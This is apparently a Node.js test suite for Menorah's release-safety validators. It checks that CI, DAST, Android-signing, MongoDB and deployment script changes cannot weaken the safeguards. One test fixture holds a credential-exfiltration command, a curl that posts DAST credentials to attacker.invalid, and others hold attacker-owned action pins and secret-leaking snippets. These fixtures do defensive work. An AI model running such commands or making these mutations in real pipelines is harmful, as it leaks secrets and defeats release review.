import assert from 'node:assert/strict';
import { readFile } from 'node:fs/promises';
import { dirname, resolve } from 'node:path';
import test from 'node:test';
import { fileURLToPath } from 'node:url';
import { Script } from 'node:vm';
import { parse } from 'yaml';

import {
  validateAndroidBuildWorkflow,
  validateBackupSchedule,
  validateDastWorkflow,
  validateDisabledCloudRunPaths,
  validateGovernance,
  validateMongoIdentityRecovery,
  validateMongoToolCredentialWrapper,
  validatePostMigrationResume,
  validateProductionComposeReleaseSafety,
  validateRecordedMigration,
  validateRunbook,
  validateRuntimeDirectoryPreparation,
  validateUpdateScript,
  validateWorkflow,
} from './validate-release-workflow.mjs';

const SCRIPT_DIR = dirname(fileURLToPath(import.meta.url));
const REPO_ROOT = resolve(SCRIPT_DIR, '../../..');
const readRepoFile = async (path) =>
  (await readFile(resolve(REPO_ROOT, path), 'utf8')).replace(/\r\n?/g, '\n');
const [
  rawWorkflow,
  rawSecurityWorkflow,
  rawDastWorkflow,
  rawAndroidBuildWorkflow,
  branchProtection,
  pullRequestTemplate,
  releaseEvidenceTemplate,
  legacyCloudBuild,
  legacyCloudRun,
  archivedCloudBuild,
  archivedCloudRun,
  operatorRunbook,
  updateScript,
  resumePostMigrationScript,
  recoverMongoIdentitiesScript,
  recordedMigrationScript,
  rawMigrationCompose,
  runtimeDirectoryPrepScript,
  rawProductionCompose,
  mongoToolCredentialWrapper,
  backupScheduleScript,
  legacyVpsSetupScript,
] = await Promise.all([
  readRepoFile('.github/workflows/deploy.yml'),
  readRepoFile('.github/workflows/security.yml'),
  readRepoFile('.github/workflows/dast.yml'),
  readRepoFile('.github/workflows/build-android.yml'),
  readRepoFile('.github/BRANCH_PROTECTION.md'),
  readRepoFile('.github/pull_request_template.md'),
  readRepoFile('.github/RELEASE_EVIDENCE_TEMPLATE.md'),
  readRepoFile('menorah/backend/cloudbuild.yaml'),
  readRepoFile('gcp/cloudrun.yaml'),
  readRepoFile('menorah/backend/legacy/cloudbuild.cloudrun.yaml.disabled'),
  readRepoFile('gcp/legacy/cloudrun.yaml.disabled'),
  readRepoFile('menorah/docs/production-update-runbook.md'),
  readRepoFile('menorah/deploy/ubuntu/update-from-git.sh'),
  readRepoFile('menorah/deploy/ubuntu/resume-post-migration-release.sh'),
  readRepoFile('menorah/deploy/ubuntu/recover-managed-mongo-identities.sh'),
  readRepoFile('menorah/deploy/ubuntu/run-recorded-migration.sh'),
  readRepoFile('menorah/deploy/docker-compose.migration.yml'),
  readRepoFile('menorah/deploy/ubuntu/prepare-runtime-directories.sh'),
  readRepoFile('menorah/deploy/docker-compose.production.yml'),
  readRepoFile('menorah/deploy/backup/run-mongo-tool-secure.sh'),
  readRepoFile('menorah/deploy/ubuntu/install-backup-schedule.sh'),
  readRepoFile('scripts/vps-setup.sh'),
]);

const copyWorkflow = () => structuredClone(parse(rawWorkflow));
const copyDastWorkflow = () => structuredClone(parse(rawDastWorkflow));
const copyAndroidBuildWorkflow = () =>
  structuredClone(parse(rawAndroidBuildWorkflow));

test('rejects a backup schedule without immediate execution-result recording', () => {
  const unsafe = backupScheduleScript.replace(
    /^ExecStopPost=.*record-backup-result\.sh.*$/m,
    '',
  );
  assert.notEqual(unsafe, backupScheduleScript);
  assert.throws(
    () => validateBackupSchedule(unsafe),
    /bounded systemd execution results/,
  );
});

test('accepts the reviewed updater with CRLF line endings', () => {
  validateUpdateScript(updateScript.replace(/\r?\n/g, '\r\n'));
});

function runDastGuard(
  targetUrl,
  trustedOrigin,
  allowedHosts = 'api-staging.menorah.me,portal.security-test.menorah.me',
) {
  const program = validateDastWorkflow(copyDastWorkflow(), rawDastWorkflow);
  return new Script(program, { filename: 'dast-origin-guard.js' }).runInNewContext({
    URL,
    process: {
      env: {
        DAST_TARGET_URL: targetUrl,
        DAST_TRUSTED_ORIGIN: trustedOrigin,
        DAST_ALLOWED_HOSTS: allowedHosts,
      },
    },
  });
}

test('accepts the repository read-only release readiness workflow', () => {
  validateWorkflow(copyWorkflow(), rawWorkflow);
});

test('rejects a missing or late backend production dependency prerequisite', () => {
  const missing = copyWorkflow();
  missing.jobs['release-readiness'].steps =
    missing.jobs['release-readiness'].steps.filter(
      (step) =>
        step.name !== 'Install deterministic backend production dependencies',
    );
  assert.throws(
    () => validateWorkflow(missing, rawWorkflow),
    /install deterministic backend production dependencies/,
  );

  const late = copyWorkflow();
  const steps = late.jobs['release-readiness'].steps;
  const dependencyStepIndex = steps.findIndex(
    (step) =>
      step.name === 'Install deterministic backend production dependencies',
  );
  const [dependencyStep] = steps.splice(dependencyStepIndex, 1);
  const validationStepIndex = steps.findIndex(
    (step) => step.name === 'Validate workflow and release safety invariants',
  );
  steps.splice(validationStepIndex + 1, 0, dependencyStep);
  assert.throws(
    () => validateWorkflow(late, rawWorkflow),
    /before release safety validation/,
  );
});

test('legacy VPS template contains no credential-bearing MongoDB URI', () => {
  assert.match(
    legacyVpsSetupScript,
    /^MONGODB_URI=REPLACE_WITH_MONGODB_CONNECTION_URI$/m,
  );
  assert.doesNotMatch(
    legacyVpsSetupScript,
    /mongodb(?:\+srv)?:\/\/[^/\s:@]+:[^@\s/]+@/i,
  );
});

test('accepts exact environment-owned staging and security-test DAST origins', () => {
  assert.doesNotThrow(() =>
    runDastGuard(
      'https://api-staging.menorah.me',
      'https://portal.security-test.menorah.me',
    ),
  );
});

test('rejects every known Menorah production host as either DAST origin', () => {
  const productionHosts = [
    'menorah.me',
    'www.menorah.me',
    'app.menorah.me',
    'admin.menorah.me',
    'counsellor.menorah.me',
    'api.menorah.me',
    'api-ios.menorah.me',
    'api-android.menorah.me',
    'api-web.menorah.me',
    'api-admin.menorah.me',
    'calls.menorah.me',
    'vps.menorah.me',
  ];

  for (const hostname of productionHosts) {
    assert.throws(() =>
      runDastGuard(`https://${hostname}`, 'https://portal-staging.menorah.me'),
    );
    assert.throws(() =>
      runDastGuard('https://api-staging.menorah.me', `https://${hostname}`),
    );
  }
});

test('rejects production-path, credential, query, fragment, and port DAST bypasses', () => {
  const rejectedOrigins = [
    'https://app.menorah.me/staging',
    'https://user:password@api-staging.menorah.me',
    'https://api-staging.menorah.me?target=production',
    'https://api-staging.menorah.me#production',
    'https://api-staging.menorah.me:8443',
    'https://api-staging.menorah.me/',
    'http://api-staging.menorah.me',
    'https://stagingexample.menorah.me',
  ];

  for (const origin of rejectedOrigins) {
    assert.throws(() =>
      runDastGuard(origin, 'https://portal-staging.menorah.me'),
    );
    assert.throws(() =>
      runDastGuard('https://api-staging.menorah.me', origin),
    );
  }
});

test('rejects staging-looking hosts outside the reviewed DAST allowlist', () => {
  assert.throws(
    () => runDastGuard(
      'https://staging.attacker.example',
      'https://portal.security-test.menorah.me',
    ),
    /not in DAST_ALLOWED_HOSTS/,
  );
  assert.throws(
    () => runDastGuard(
      'https://api-staging.menorah.me',
      'https://portal.security-test.menorah.me',
      'api-staging.menorah.me,app.menorah.me',
    ),
    /unsafe hostname/,
  );
  assert.throws(
    () => runDastGuard(
      'https://api-staging.menorah.me.',
      'https://portal.security-test.menorah.me',
      'api-staging.menorah.me.,portal.security-test.menorah.me',
    ),
  );
});

test('rejects weakening the authenticated DAST active scan', () => {
  const weakened = rawDastWorkflow.replace(
    'zap.sh -cmd -autorun /zap/wrk/zap.yml',
    'zap.sh -cmd -quickurl "$DAST_TARGET_URL"',
  );
  assert.notEqual(weakened, rawDastWorkflow);
  assert.throws(
    () => validateDastWorkflow(parse(weakened), weakened),
    /credential-bound command digest|authenticated ZAP active scan plan/,
  );
});

test('rejects an automatic or credential-exfiltrating DAST mutation', () => {
  const automatic = copyDastWorkflow();
  automatic.on.push = { branches: ['main'] };
  assert.throws(
    () => validateDastWorkflow(automatic, rawDastWorkflow),
    /scheduled\/manual only/,
  );

  const exfiltrating = copyDastWorkflow();
  exfiltrating.jobs.zap.steps.splice(1, 0, {
    name: 'Publish credentials',
    run: 'curl -d \"$DAST_EMAIL:$DAST_PASSWORD\" https://attacker.invalid',
  });
  assert.throws(
    () => validateDastWorkflow(exfiltrating, rawDastWorkflow),
    /step order and credential boundary/,
  );
});

test('rejects continue-on-error on the DAST job and pre-credential guards', () => {
  const mutations = [
    (workflow) => {
      workflow.jobs.zap['continue-on-error'] = true;
    },
    (workflow) => {
      workflow.jobs.zap.steps[1]['continue-on-error'] = true;
    },
    (workflow) => {
      workflow.jobs.zap.steps[2]['continue-on-error'] = true;
    },
  ];

  for (const mutate of mutations) {
    const workflow = copyDastWorkflow();
    mutate(workflow);
    assert.throws(
      () => validateDastWorkflow(workflow, rawDastWorkflow),
      /must not use continue-on-error/,
    );
  }
});

test('rejects workflow-level environment and shell-default inheritance in DAST', () => {
  const mutations = [
    (workflow) => {
      workflow.env = { BASH_ENV: '/tmp/unreviewed-dast-environment' };
    },
    (workflow) => {
      workflow.defaults = { run: { shell: 'sh' } };
    },
  ];

  for (const mutate of mutations) {
    const workflow = copyDastWorkflow();
    mutate(workflow);
    assert.throws(
      () => validateDastWorkflow(workflow, rawDastWorkflow),
      /DAST workflow fields must remain exact/,
    );
  }
});

test('rejects an attacker-owned action even when the DAST action has a full SHA', () => {
  const workflow = copyDastWorkflow();
  workflow.jobs.zap.steps[0].uses =
    'attacker/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0';

  assert.throws(
    () => validateDastWorkflow(workflow, rawDastWorkflow),
    /must use the exact reviewed action/,
  );
});

test('rejects unexpected DAST step environment, condition, and shell fields', () => {
  const mutations = [
    {
      mutate: (step) => {
        step.env = { DAST_PASSWORD_COPY: '$DAST_PASSWORD' };
      },
      message: /must not gain step-level environment values/,
    },
    {
      mutate: (step) => {
        step.if = 'always()';
      },
      message: /must retain its exact condition/,
    },
    {
      mutate: (step) => {
        step.shell = 'sh';
      },
      message: /must retain its exact shell/,
    },
  ];

  for (const { mutate, message } of mutations) {
    const workflow = copyDastWorkflow();
    mutate(workflow.jobs.zap.steps[1]);
    assert.throws(
      () => validateDastWorkflow(workflow, rawDastWorkflow),
      message,
    );
  }
});

test('rejects dot-form and bracket-form secret interpolation in DAST run commands', () => {
  const secretReferences = [
    '${{ secrets.DAST_PASSWORD }}',
    "${{ secrets['DAST_PASSWORD'] }}",
  ];

  for (const reference of secretReferences) {
    const workflow = copyDastWorkflow();
    workflow.jobs.zap.steps[3].run += `\nprintf '%s' '${reference}'\n`;
    assert.throws(
      () => validateDastWorkflow(workflow, rawDastWorkflow),
      /must not interpolate a secret directly in run/,
    );
  }
});

test('accepts the manual main-head-only Android signing workflow', () => {
  validateAndroidBuildWorkflow(
    copyAndroidBuildWorkflow(),
    rawAndroidBuildWorkflow,
  );
});

test('rejects Android signing of a SHA other than the dispatch main HEAD', () => {
  const weakenedRaw = rawAndroidBuildWorkflow.replace(
    'if [[ \"$GITHUB_TRIGGER_REF\" != \"refs/heads/main\" || \"$RELEASE_SHA\" != \"$GITHUB_TRIGGER_SHA\" ]]; then',
    'if [[ \"$GITHUB_TRIGGER_REF\" != \"refs/heads/main\" ]]; then',
  );
  assert.notEqual(weakenedRaw, rawAndroidBuildWorkflow);
  assert.throws(
    () => validateAndroidBuildWorkflow(parse(weakenedRaw), weakenedRaw),
    /input must equal the workflow-dispatch main HEAD/,
  );
});

test('rejects moving Android signing secrets into an unreviewed step', () => {
  const weakened = copyAndroidBuildWorkflow();
  weakened.jobs.build.steps.splice(1, 0, {
    name: 'Use signing secret early',
    env: {
      ANDROID_KEYSTORE_BASE64: '${{ secrets.ANDROID_KEYSTORE_BASE64 }}',
    },
    run: 'echo unsafe',
  });
  assert.throws(
    () => validateAndroidBuildWorkflow(weakened, rawAndroidBuildWorkflow),
    /step order and secret boundary/,
  );
});

test('rejects continue-on-error on the Android signing job or any guard step', () => {
  const mutations = [
    (workflow) => {
      workflow.jobs.build['continue-on-error'] = true;
    },
    (workflow) => {
      workflow.jobs.build.steps[0]['continue-on-error'] = true;
    },
    (workflow) => {
      workflow.jobs.build.steps[2]['continue-on-error'] = true;
    },
  ];

  for (const mutate of mutations) {
    const workflow = copyAndroidBuildWorkflow();
    mutate(workflow);
    assert.throws(
      () => validateAndroidBuildWorkflow(workflow, rawAndroidBuildWorkflow),
      /must not use continue-on-error/,
    );
  }
});

test('rejects workflow-level environment and shell-default inheritance in Android signing', () => {
  const mutations = [
    (workflow) => {
      workflow.env = { BASH_ENV: '/tmp/unreviewed-android-environment' };
    },
    (workflow) => {
      workflow.defaults = { run: { shell: 'sh' } };
    },
  ];

  for (const mutate of mutations) {
    const workflow = copyAndroidBuildWorkflow();
    mutate(workflow);
    assert.throws(
      () => validateAndroidBuildWorkflow(workflow, rawAndroidBuildWorkflow),
      /Android signing workflow fields must remain exact/,
    );
  }
});

test('rejects a comment-only or no-op Android release approval guard', () => {
  const workflow = copyAndroidBuildWorkflow();
  workflow.jobs.build.steps[0].run = [
    '# ^[0-9a-f]{40}$',
    '# "$GITHUB_TRIGGER_REF" != "refs/heads/main"',
    '# "$RELEASE_SHA" != "$GITHUB_TRIGGER_SHA"',
    '# "$ANDROID_RELEASE_SIGNING_READY" != "protected-main-only"',
    'true',
  ].join('\n');

  assert.throws(
    () => validateAndroidBuildWorkflow(workflow, rawAndroidBuildWorkflow),
    /approved release guard command changed/,
  );
});

test('rejects dot-form and bracket-form secret interpolation in Android run commands', () => {
  const secretReferences = [
    '${{ secrets.ANDROID_KEY_PASSWORD }}',
    "${{ secrets['ANDROID_KEY_PASSWORD'] }}",
  ];

  for (const reference of secretReferences) {
    const workflow = copyAndroidBuildWorkflow();
    workflow.jobs.build.steps[5].run += `\nprintf '%s' '${reference}'\n`;
    assert.throws(
      () => validateAndroidBuildWorkflow(workflow, rawAndroidBuildWorkflow),
      /must not interpolate a secret directly in run/,
    );
  }
});

test('rejects an attacker-owned action even when the Android action has a full SHA', () => {
  const workflow = copyAndroidBuildWorkflow();
  workflow.jobs.build.steps[1].uses =
    'attacker/checkout@11bd71901bbe5b1630ceea73d27597364c9af683';

  assert.throws(
    () => validateAndroidBuildWorkflow(workflow, rawAndroidBuildWorkflow),
    /must use the exact reviewed action/,
  );
});

test('rejects unexpected Android step environment, condition, and shell fields', () => {
  const mutations = [
    {
      index: 5,
      mutate: (step) => {
        step.env = {
          EARLY_SECRET: "${{ secrets['ANDROID_KEYSTORE_PASSWORD'] }}",
        };
      },
      message: /must retain its exact environment boundary/,
    },
    {
      index: 7,
      mutate: (step) => {
        step.if = 'always()';
      },
      message: /must retain its exact condition/,
    },
    {
      index: 0,
      mutate: (step) => {
        step.shell = 'sh';
      },
      message: /must not override its reviewed shell/,
    },
  ];

  for (const { index, mutate, message } of mutations) {
    const workflow = copyAndroidBuildWorkflow();
    mutate(workflow.jobs.build.steps[index]);
    assert.throws(
      () => validateAndroidBuildWorkflow(workflow, rawAndroidBuildWorkflow),
      message,
    );
  }
});

test('rejects a workflow that consumes a repository secret', () => {
  const workflow = copyWorkflow();
  workflow.jobs['release-readiness'].steps.push({
    name: 'Unsafe secret use',
    env: { TOKEN: '${{ secrets.PRODUCTION_TOKEN }}' },
    run: 'true',
  });

  assert.throws(
    () => validateWorkflow(workflow, rawWorkflow),
    /readiness must not consume secrets/,
  );
});

test('rejects a security workflow action pinned only to a moving tag', () => {
  const securityWorkflow = parse(
    rawSecurityWorkflow.replace(
      'actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0',
      'actions/checkout@v7',
    ),
  );
  assert.throws(
    () => validateGovernance(
      securityWorkflow,
      branchProtection,
      pullRequestTemplate,
      releaseEvidenceTemplate,
    ),
    /security action must be commit-pinned/,
  );
});

test('requires all three stable checks in governance and the operator runbook', () => {
  const securityWorkflow = parse(rawSecurityWorkflow);
  assert.doesNotThrow(() =>
    validateGovernance(
      securityWorkflow,
      branchProtection,
      pullRequestTemplate,
      releaseEvidenceTemplate,
    ),
  );
  assert.doesNotThrow(() => validateRunbook(operatorRunbook));

  const branchWithoutFunctionalGate = branchProtection.replace(
    '  - `Required functional release gates`\n',
    '',
  );
  assert.notEqual(branchWithoutFunctionalGate, branchProtection);
  assert.throws(
    () =>
      validateGovernance(
        securityWorkflow,
        branchWithoutFunctionalGate,
        pullRequestTemplate,
        releaseEvidenceTemplate,
      ),
    /stable Required functional release gates check/,
  );

  const evidenceWithoutFunctionalGate = releaseEvidenceTemplate.replace(
    '- `Required functional release gates` run:\n',
    '',
  );
  assert.notEqual(evidenceWithoutFunctionalGate, releaseEvidenceTemplate);
  assert.throws(
    () =>
      validateGovernance(
        securityWorkflow,
        branchProtection,
        pullRequestTemplate,
        evidenceWithoutFunctionalGate,
      ),
    /stable Required functional release gates check/,
  );

  const runbookWithoutFunctionalGate = operatorRunbook.replaceAll(
    '`Required functional release gates`',
    '`Omitted functional release gate`',
  );
  assert.notEqual(runbookWithoutFunctionalGate, operatorRunbook);
  assert.throws(
    () => validateRunbook(runbookWithoutFunctionalGate),
    /all three stable checks/,
  );
});

test('rejects a production call origin in security image builds', () => {
  const securityWorkflow = parse(
    rawSecurityWorkflow.replace(
      'https://calls.security-test.invalid',
      'https://calls.menorah.me',
    ),
  );
  assert.throws(
    () => validateGovernance(
      securityWorkflow,
      branchProtection,
      pullRequestTemplate,
      releaseEvidenceTemplate,
    ),
    /security image builds must use only the reviewed non-routable call origin/,
  );
});

test('rejects a workflow that mutates a Compose runtime', () => {
  const workflow = copyWorkflow();
  workflow.jobs['release-readiness'].steps.push({
    name: 'Unsafe runtime mutation',
    run: 'docker compose up -d',
  });

  assert.throws(
    () => validateWorkflow(workflow, `${rawWorkflow}\ndocker compose up -d\n`),
    /readiness must never mutate a Compose runtime/,
  );
});

test('rejects manual validation without a required full-SHA input', () => {
  const workflow = copyWorkflow();
  delete workflow.on.workflow_dispatch.inputs.candidate_sha;

  assert.throws(
    () => validateWorkflow(workflow, rawWorkflow),
    /manual readiness must require an immutable candidate input/,
  );
});

test('rejects checkout of a moving ref instead of the candidate SHA', () => {
  const workflow = copyWorkflow();
  const checkout = workflow.jobs['release-readiness'].steps.find(
    (step) => step.name === 'Checkout candidate exactly',
  );
  checkout.with.ref = 'main';

  assert.throws(
    () => validateWorkflow(workflow, rawWorkflow),
    /Expected values to be strictly equal/,
  );
});

test('accepts only the fail-closed legacy cloud deployment tombstones', () => {
  validateDisabledCloudRunPaths(
    legacyCloudBuild,
    legacyCloudRun,
    archivedCloudBuild,
    archivedCloudRun,
    operatorRunbook,
  );
});

test('rejects reactivating build steps at the former Cloud Build path', () => {
  assert.throws(
    () =>
      validateDisabledCloudRunPaths(
        `${legacyCloudBuild}\nsteps: []\n`,
        legacyCloudRun,
        archivedCloudBuild,
        archivedCloudRun,
        operatorRunbook,
      ),
    /legacy active paths must remain invalid deployment inputs/,
  );
});

test('rejects reactivating a Service at the former Cloud Run path', () => {
  assert.throws(
    () =>
      validateDisabledCloudRunPaths(
        legacyCloudBuild,
        `${legacyCloudRun}\napiVersion: serving.knative.dev\/v1\nkind: Service\n`,
        archivedCloudBuild,
        archivedCloudRun,
        operatorRunbook,
      ),
    /legacy active paths must remain invalid deployment inputs/,
  );
});

test('rejects managed-user role mutation before the maintenance boundary', () => {
  const reconciliationBlock = updateScript.match(
    /echo "Provisioning missing managed MongoDB identities[\s\S]*?validate_mongodb_monitoring_identity\n/,
  )?.[0];
  assert.ok(reconciliationBlock);
  const unsafe = updateScript
    .replace(reconciliationBlock, '')
    .replace(
      'echo "Building release images before maintenance begins..."',
      `${reconciliationBlock}\necho "Building release images before maintenance begins..."`,
    );

  assert.throws(
    () => validateUpdateScript(unsafe),
    /must run after writers stop and before migration|writers must be verified stopped/,
  );
});

test('rejects candidate-only validation before the exact candidate checkout', () => {
  const validationCall = '\nvalidate_monitoring_release_config\n';
  assert.ok(updateScript.includes(validationCall));
  const unsafe = updateScript
    .replace(validationCall, '\n')
    .replace(
      'git -C "${REPO_ROOT}" checkout --detach "${REVIEWED_SHA}"',
      `validate_monitoring_release_config\n\ngit -C "\${REPO_ROOT}" checkout --detach "\${REVIEWED_SHA}"`,
    );

  assert.throws(
    () => validateUpdateScript(unsafe),
    /candidate-only monitoring validators must run after the exact checkout/,
  );
});

test('rejects provisioning the first-adoption backup identity after the mandatory backup', () => {
  const applyCall = '\nrun_managed_mongo_bootstrap apply backup-only\n';
  const verifyCall = '\nrun_managed_mongo_bootstrap preflight backup-only\n';
  const backupCall = 'BACKUP_DEPLOYED_RELEASE_SHA="${PREVIOUS_SHA}" "${SCRIPT_DIR}/backup-now.sh" manual';
  assert.ok(updateScript.includes(applyCall));
  assert.ok(updateScript.includes(verifyCall));
  assert.ok(updateScript.includes(backupCall));
  const unsafe = updateScript
    .replace(applyCall, '\n')
    .replace(verifyCall, '\n')
    .replace(backupCall, `${backupCall}${applyCall}${verifyCall}`);

  assert.throws(
    () => validateUpdateScript(unsafe),
    /atomic backup-identity provisioning must run after checkout and before the mandatory backup/,
  );
});

test('rejects relinquishing guarded control of MongoDB bootstrap scope', () => {
  const unsafe = updateScript.replace(
    'Routine releases must leave MONGO_BOOTSTRAP_SCOPE unset.',
    'Operator-selected scope accepted.',
  );
  assert.notEqual(unsafe, updateScript);
  assert.throws(
    () => validateUpdateScript(unsafe),
    /operator-supplied MongoDB bootstrap scope must be rejected/,
  );
});

test('rejects MongoDB root credentials in updater process arguments', () => {
  const unsafe = `${updateScript}\nmongosh -p "$MONGO_ROOT_PASSWORD" --quiet\n`;
  assert.throws(
    () => validateUpdateScript(unsafe),
    /MongoDB root passwords must not enter process arguments/,
  );
});

test('rejects candidate MongoDB programs executed through mongosh stdin REPL mode', () => {
  const unsafe = `${updateScript}\nprintf x | compose_cmd exec -T mongo-primary mongosh --nodb --quiet\n`;
  assert.throws(
    () => validateUpdateScript(unsafe),
    /must not run through mongosh stdin REPL mode/,
  );
});

test('rejects candidate-updater handoff after candidate checkout', () => {
  const call = '\nensure_reviewed_updater_execution\n';
  assert.ok(updateScript.includes(call));
  const unsafe = updateScript
    .replace(call, '\n')
    .replace(
      'git -C "${REPO_ROOT}" checkout --detach "${REVIEWED_SHA}"',
      'git -C "${REPO_ROOT}" checkout --detach "${REVIEWED_SHA}"\nensure_reviewed_updater_execution',
    );

  assert.throws(
    () => validateUpdateScript(unsafe),
    /candidate updater handoff and predecessor baseline must precede candidate checkout/,
  );
});

test('rejects predecessor artifact capture after candidate checkout', () => {
  const call = '\n  ensure_predecessor_artifact_baseline\n';
  assert.ok(updateScript.includes(call));
  const unsafe = updateScript
    .replace(call, '\n')
    .replace(
      'git -C "${REPO_ROOT}" checkout --detach "${REVIEWED_SHA}"',
      'git -C "${REPO_ROOT}" checkout --detach "${REVIEWED_SHA}"\n  ensure_predecessor_artifact_baseline',
    );

  assert.throws(
    () => validateUpdateScript(unsafe),
    /candidate updater handoff and predecessor baseline must precede candidate checkout/,
  );
});

test('rejects media consolidation before writers are verified stopped', () => {
  const marker = 'echo "Consolidating legacy per-service media into the shared namespace without deleting predecessor copies..."';
  assert.ok(updateScript.includes(marker));
  const unsafe = updateScript
    .replace(marker, '')
    .replace('MAINTENANCE_STARTED=true', `${marker}\nMAINTENANCE_STARTED=true`);

  assert.throws(
    () => validateUpdateScript(unsafe),
    /media transition, managed-user reconciliation, and monitoring verification must run after writers stop/,
  );
});

test('rejects removal of the same-SHA bootstrap replay guard', () => {
  const unsafe = updateScript.replace('Same-SHA release replay is refused', 'Same release may run again');
  assert.notEqual(unsafe, updateScript);
  assert.throws(
    () => validateUpdateScript(unsafe),
    /healthy same-SHA replay refusal/,
  );
});

test('rejects post-migration failure handling that does not stop writers', () => {
  const unsafe = updateScript.replace(
    /if ! compose_cmd stop -t "\$\{DEPLOY_STOP_TIMEOUT_SECONDS:-60\}" "\$\{WRITER_SERVICES\[@\]\}"; then/,
    'if ! true; then',
  );
  assert.notEqual(unsafe, updateScript);
  assert.throws(
    () => validateUpdateScript(unsafe),
    /post-migration failure handling must stop writers/,
  );
});

test('rejects legacy-agent retirement after the current release marker', () => {
  const currentMarker = 'write_marker_atomically "${CURRENT_SHA_FILE}" "${NEW_SHA}"';
  assert.ok(updateScript.includes(currentMarker));
  const unsafe = updateScript
    .replace(currentMarker, '')
    .replace('retire_legacy_compose_services', `retire_legacy_compose_services\n${currentMarker}`);

  assert.throws(
    () => validateUpdateScript(unsafe),
    /predecessor-only socket\/log agents must retire after migration health and before release completion/,
  );
});

test('accepts the dedicated networkless Caddy validator and rollback-safe bindings', () => {
  validateProductionComposeReleaseSafety(parse(rawProductionCompose, { merge: true }));
});

test('rejects a Caddy validator attached to the application network', () => {
  const compose = parse(rawProductionCompose, { merge: true });
  delete compose.services['caddy-config-validator'].network_mode;
  compose.services['caddy-config-validator'].networks = { app: {} };
  assert.throws(
    () => validateProductionComposeReleaseSafety(compose),
    /Expected values to be strictly equal|deep-equal/,
  );
});

test('rejects a non-loopback production host binding', () => {
  const compose = parse(rawProductionCompose, { merge: true });
  compose.services['api-web'].ports = ['${API_WEB_LOCAL_PORT:-18082}:8080'];
  assert.throws(
    () => validateProductionComposeReleaseSafety(compose),
    /api-web must retain a loopback-safe default/,
  );
});

test('accepts the guarded post-migration resume workflow', () => {
  validatePostMigrationResume(resumePostMigrationScript);
});

test('rejects a post-migration failure trap armed before state validation', () => {
  const trap = "trap 'status=$?; trap - EXIT; on_exit \"${status}\"; exit \"${status}\"' EXIT";
  assert.ok(resumePostMigrationScript.includes(trap));
  const unsafe = resumePostMigrationScript
    .replace(trap, '')
    .replace(
      '[[ "${MENORAH_POST_MIGRATION_RECOVERY_CONFIRM:-}" == "RESUME_RECORDED_RELEASE" ]]',
      `${trap}\n[[ "\${MENORAH_POST_MIGRATION_RECOVERY_CONFIRM:-}" == "RESUME_RECORDED_RELEASE" ]]`,
    );
  assert.throws(
    () => validatePostMigrationResume(unsafe),
    /post-migration failure trap must arm after authority\/state checks/,
  );
});

test('rejects migration execution in post-migration resume', () => {
  assert.throws(
    () => validatePostMigrationResume(`${resumePostMigrationScript}\nnode src/database/migrate.js\n`),
    /post-migration resume must never rerun a migration/,
  );
});

test('accepts the guarded managed MongoDB identity recovery workflow', () => {
  validateMongoIdentityRecovery(recoverMongoIdentitiesScript);
});

test('rejects a partial bootstrap scope in managed MongoDB identity recovery', () => {
  const unsafe = recoverMongoIdentitiesScript.replaceAll(
    'MONGO_BOOTSTRAP_SCOPE all',
    'MONGO_BOOTSTRAP_SCOPE backup-only',
  );
  assert.notEqual(unsafe, recoverMongoIdentitiesScript);
  assert.throws(
    () => validateMongoIdentityRecovery(unsafe),
    /managed-identity recovery must force the full bootstrap scope/,
  );
});

test('rejects managed MongoDB recovery through mongosh stdin REPL mode', () => {
  const unsafe = `${recoverMongoIdentitiesScript}\nprintf x | compose_cmd exec -T mongo-primary mongosh --nodb --quiet\n`;
  assert.throws(
    () => validateMongoIdentityRecovery(unsafe),
    /must not run candidate programs through mongosh stdin REPL mode/,
  );
});

test('accepts the ephemeral MongoDB Database Tools credential wrapper', () => {
  validateMongoToolCredentialWrapper(mongoToolCredentialWrapper);
});

test('rejects passing the credential-bearing URI to a MongoDB tool', () => {
  const unsafe = mongoToolCredentialWrapper.replace(
    '"${tool}" --config="${config_file}" "$@"',
    '"${tool}" "${uri}" "$@"',
  );
  assert.notEqual(unsafe, mongoToolCredentialWrapper);
  assert.throws(
    () => validateMongoToolCredentialWrapper(unsafe),
    /authenticate via --config|never pass the URI/,
  );
});

test('rejects clearing the MongoDB identity marker before exact-role verification', () => {
  const markerClear = 'rm -f -- "${IDENTITY_MARKER}"';
  assert.ok(recoverMongoIdentitiesScript.includes(markerClear));
  const unsafe = recoverMongoIdentitiesScript
    .replace(markerClear, '')
    .replace('run_reconciliation apply', `${markerClear}\nrun_reconciliation apply`);
  assert.throws(
    () => validateMongoIdentityRecovery(unsafe),
    /stop writers, finish idempotent provisioning, and verify exact roles before clearing state/,
  );
});

test('rejects starting writers from MongoDB identity recovery', () => {
  assert.throws(
    () => validateMongoIdentityRecovery(`${recoverMongoIdentitiesScript}\ncompose_cmd start api-web\n`),
    /managed-identity recovery must neither migrate nor restart writers/,
  );
});

test('accepts migration bound to the checksum-recorded api-web image', () => {
  validateRecordedMigration(recordedMigrationScript, parse(rawMigrationCompose));
});

test('rejects migration that may pull after artifact capture', () => {
  const unsafe = recordedMigrationScript.replace('--pull never', '--pull always');
  assert.notEqual(unsafe, recordedMigrationScript);
  assert.throws(
    () => validateRecordedMigration(unsafe, parse(rawMigrationCompose)),
    /must run once without build, dependency start, or pull/,
  );
});

test('rejects migration checksum evidence not bound to the manifest basename', () => {
  const unsafe = recordedMigrationScript.replace(
    '&& "${BASH_REMATCH[2]}" == "${manifest_basename}"',
    '',
  );
  assert.notEqual(unsafe, recordedMigrationScript);
  assert.throws(
    () => validateRecordedMigration(unsafe, parse(rawMigrationCompose)),
    /checksum must name the exact manifest basename/,
  );
});

test('rejects a migration override using a mutable api-web tag', () => {
  const compose = parse(rawMigrationCompose);
  compose.services['api-web'].image = 'menorah-api-web:latest';
  assert.throws(
    () => validateRecordedMigration(recordedMigrationScript, compose),
    /migration override must select only the recorded api-web content ID/,
  );
});

test('accepts exact empty-host runtime-directory preparation', () => {
  validateRuntimeDirectoryPreparation(runtimeDirectoryPrepScript);
});

test('rejects runtime-directory preparation that accepts pre-existing data', () => {
  const unsafe = runtimeDirectoryPrepScript.replace(
    /  if ! first_entry="\$\(find "\$\{target\}" -mindepth 1 -print -quit\)"; then[\s\S]*?  if \[ -n "\$\{first_entry\}" \]; then[\s\S]*?  fi\n/,
    '',
  );
  assert.notEqual(unsafe, runtimeDirectoryPrepScript);
  assert.throws(
    () => validateRuntimeDirectoryPreparation(unsafe),
    /runtime directory preparation must refuse non-empty targets/,
  );
});
